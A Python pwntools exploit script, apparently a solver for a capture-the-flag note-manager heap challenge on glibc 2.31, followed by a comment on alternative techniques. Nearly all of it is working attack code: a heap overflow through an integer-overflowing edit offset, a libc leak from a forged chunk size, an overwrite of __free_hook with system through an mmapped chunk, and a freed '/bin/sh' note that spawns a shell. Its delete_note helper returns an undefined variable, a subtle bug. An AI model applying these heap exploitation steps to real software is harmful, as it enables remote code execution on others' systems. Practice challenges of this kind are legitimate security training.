from pwn import *


def debug(func):
    from functools import wraps
    @wraps(func)
    def wrapper(*args, **kwargs):
        print("{}({}, {})".format(func.__name__, str(args), str(kwargs)))
        return func(*args, **kwargs)
    return wrapper


@debug
def create_note(index, size, content):
    io.sendlineafter(b'hoice: ', b'1')
    io.sendlineafter(b'Index: ', b'%d' % index)
    io.sendlineafter(b'Size: ', b'%d' % size)
    if size == len(content):
        io.sendafter(b'Content: ', content)
    else:
        io.sendlineafter(b'Content: ', content)
    io.recvuntil(b'C')


@debug
def edit_note(index, offset, count, content):
    io.sendlineafter(b'hoice: ', b'2')
    io.sendlineafter(b'Index: ', b'%d' % index)
    io.sendlineafter(b'Offset: ', b'%d' % offset)
    io.sendlineafter(b'Count: ', b'%d' % count)
    io.sendlineafter(b'Content: ', content)
    io.recvuntil(b'C')


@debug
def print_note(index):
    io.sendlineafter(b'hoice: ', b'3')
    io.sendlineafter(b'Index: ', b'%d' % index)
    io.recvuntil(b'Content: ')
    data = io.recvline().rstrip()
    io.recvuntil(b'C')
    return data


@debug
def delete_note(index):
    io.sendlineafter(b'hoice: ', b'4')
    io.sendlineafter(b'Index: ', b'%d' % index)
    io.recvuntil(b'C')
    return data

binpath = './chall'
elf = ELF(binpath)
libc = ELF('./libc-2.31.so')

gdbscript = '''
gef
b CreateNote
b EditNote
b PrintNote
b DeleteNote

set $noteList=(0x0000555555554000+0x4040)

# ignore 1 37 
# ignore 2 4
# ignore 3 2
# ignore 4 33

c
'''
io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(binpath)

INT_MAX = 2147483647

# leak libc
create_note(0, 0x18, b'A')
create_note(1, 0x18, b'B')
create_note(2, 0x448, b'C')
create_note(3, 0x448, b'D')

payload = b''
payload += b'E' * 0x10
payload += p64(0x471)  # fake size (chunk_B + chunk_C)
edit_note(0, 8, INT_MAX - 7, payload)
delete_note(1)
create_note(1, 0x18, b'F')
data = print_note(2)

addr_main_arena = u64(data[:8])
libc.address = addr_main_arena - 0x1ebbe0
print('libc.address = 0x{:x}'.format(libc.address))

delete_note(0)
delete_note(1)
delete_note(3)

mmap_threshold = 0x40000
create_note(0, mmap_threshold - 8, b'G')
# offset between mmaped area and libc is always the same
off_mmap_area_free_hook = 0x22fb18
edit_note(0, off_mmap_area_free_hook, (INT_MAX - off_mmap_area_free_hook + 1), p64(libc.symbols['system']))

create_note(1, 0x28, b'/bin/sh\x00')
io.sendlineafter(b'hoice: ', b'4')  # delete_note(1)
io.sendlineafter(b'Index: ', b'1')

"""
In this solver to overwrite __free_hook I used the fact that mmapped memory
will be allocated just before libc with constant offset.

There is another way to overwrite __free_hook.
Since when allocating heap from fastbins the size is checked (unlike tcache),
it is a common technique to use the MS Byte of the libc address (0x7f...) as fastbins size.

This technique is trivial for __malloc_hook since there is a bunch of data
before &__malloc_hook which contains own libc address.

However, when attempting to overwrite __free_hook, there is a tragic fact,
that most of the data before &__free_hook is just zero, and useless
in treating it as fastbins size. (I gave up)

This writeup (https://linz04.github.io/ctf/2021/11/07/padnote.html) shows that
there is a data which can be used as fastbins size at libc.address+0x1ed560+165.

This is 0x1523 bytes before &__free_hook but still can be overwritten by
the overflow in this challenge.
"""

io.interactive()
